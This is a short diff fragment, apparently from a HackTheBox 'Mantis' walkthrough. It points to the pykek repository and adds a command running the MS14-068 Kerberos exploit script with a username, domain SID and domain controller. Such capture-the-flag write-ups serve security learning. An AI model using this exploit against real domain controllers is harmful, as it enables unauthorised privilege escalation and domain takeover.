@@ -86,5 +86,6 @@ Now will need to run a code
 https://github.com/mubix/pykek.git
 clone this repo
 ```
-
+python2 ms14-068.py -u james@htb.local -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis.htb.local
 ```
+
